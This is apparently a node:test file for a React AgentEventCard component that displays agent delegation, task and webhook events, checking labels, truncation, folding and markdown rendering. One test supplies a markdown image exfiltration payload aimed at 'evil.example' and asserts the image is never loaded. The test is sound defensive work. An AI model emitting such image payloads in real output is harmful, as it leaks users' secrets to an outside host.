import assert from "node:assert/strict";
import test from "node:test";
import { createJiti } from "jiti";
import { readFileSync } from "node:fs";

const source = readFileSync(new URL("./AgentEventCard.tsx", import.meta.url), "utf8");

const jiti = createJiti(import.meta.url, { jsx: { runtime: "automatic" }, tsconfigPaths: true });
const React = await jiti.import("react");
const { renderToStaticMarkup } = await jiti.import("react-dom/server");
const { AgentEventCard } = await jiti.import("./AgentEventCard.tsx");
const { I18nProvider } = await jiti.import("@/hooks/useI18n");
const ev = await jiti.import("@/lib/agents/events.ts");

const render = (data, props = {}) => renderToStaticMarkup(
  React.createElement(I18nProvider, null, React.createElement(AgentEventCard, { message: ev.agentEventToUiMessage(data), ...props })),
);
const done = { id: "t1", title: "check plan", agent: "Martin", status: "completed", result: "ok", sessionId: "s1", kind: "review", usage: { externalTools: false } };

test("a review card says Review by; a hand-over card and an older card without purpose say Result from", () => {
  assert.match(render(ev.delegationEventOfTask(done)), /Review by Martin/);
  assert.match(render(ev.delegationEventOfTask({ ...done, kind: "task" })), /Result from Martin/);
  const legacy = { ...ev.delegationEventOfTask(done) };
  delete legacy.purpose;
  assert.match(render(legacy), /Result from Martin/);
});

test("a clipped card says so and its Inject button says it injects the truncated text", () => {
  const html = render(ev.delegationEventOfTask({ ...done, result: "r".repeat(20_000) }), { onInject: () => {}, onOpenSession: () => {} });
  assert.match(html, /truncated — see the run/);
  assert.match(html, /Inject \(truncated\)/);
  const whole = render(ev.delegationEventOfTask(done), { onInject: () => {} });
  assert.doesNotMatch(whole, /truncated/);
  assert.match(whole, /Inject into the conversation/);
});

test("a task card folds to a system line; the requester hint waits behind the fold", () => {
  const task = { taskId: "t", title: "x", requestedBy: "user", handedFrom: "Julien" };
  const folded = render(ev.buildTaskEvent(task));
  assert.match(folded, /class="agent-event-line" aria-expanded="false"/);
  assert.doesNotMatch(folded, /handed over from Julien/);
  const open = render(ev.buildTaskEvent(task), { defaultOpen: true });
  assert.match(open, /handed over from Julien/);
  assert.doesNotMatch(render(ev.buildTaskEvent({ taskId: "t", title: "x", requestedBy: "user" }), { defaultOpen: true }), /handed over/);
});

test("a delegation summary renders as markdown; a long one folds behind an Expand toggle", () => {
  const short = render(ev.delegationEventOfTask({ ...done, result: "**bold** finding" }));
  assert.match(short, /<strong>bold<\/strong>/);
  assert.doesNotMatch(short, /aria-expanded/);
  const long = render(ev.delegationEventOfTask({ ...done, result: Array.from({ length: 40 }, (_, i) => `- finding ${i}`).join("\n") }));
  assert.match(long, /class="agent-event-summary is-collapsed"/);
  assert.doesNotMatch(long, /inert/); // the visible part stays selectable and its links clickable
  assert.match(source, /onFocus=\{foldable && !expanded \? \(\) => setExpanded\(true\) : undefined\}/);
  assert.match(long, /aria-expanded="false"/);
  assert.match(long, />Expand</);
});

test("a delegation summary never loads a markdown image", () => {
  const html = render(ev.delegationEventOfTask({ ...done, result: "![pixel](https://evil.example/p.png?d=secret)" }));
  assert.doesNotMatch(html, /<img/);
  assert.match(html, /🖼 pixel/);
});

test("a webhook summary is hidden behind the folded line and stays raw text when open", () => {
  const event = ev.buildWebhookEvent({ taskId: "w", triggerId: "g", title: "alert", status: "completed", summary: "**raw**" });
  const folded = render(event);
  assert.match(folded, /class="agent-event-line"/);
  assert.doesNotMatch(folded, /\*\*raw\*\*/);
  const open = render(event, { defaultOpen: true });
  assert.match(open, /\*\*raw\*\*/);
  assert.doesNotMatch(open, /<strong>raw<\/strong>/);
});

test("an open failed webhook offers its retry and see-run controls", () => {
  const event = ev.buildWebhookEvent({ taskId: "w", triggerId: "g", title: "alert", status: "failed", summary: "boom", runSessionId: "s1" });
  const open = render(event, { defaultOpen: true, onOpenSession: () => {} });
  assert.match(open, /class="agent-event-failed"/);
  assert.equal(open.match(/class="agent-event-link"/g)?.length, 2);
});

test("schedule, task and webhook events fold to a system line; delegation results stay open", async () => {
  const { readFile } = await import("node:fs/promises");
  const card = await readFile(new URL("./AgentEventCard.tsx", import.meta.url), "utf8");
  assert.match(card, /const \[open, setOpen\] = useState\(defaultOpen \?\? false\);/);
  assert.match(card, /className="agent-event-line"/);
  assert.match(card, /data-failed=\{failed \|\| undefined\}/);
  assert.match(card, /aria-expanded=\{false\}/);
  assert.match(card, /t\("i18n\.collapse"\)/);
  const delegation = card.indexOf('data.kind === "delegation"');
  const line = card.indexOf('className="agent-event-line"');
  assert.ok(delegation >= 0 && line > delegation, "the delegation branch returns before the folded line");
});
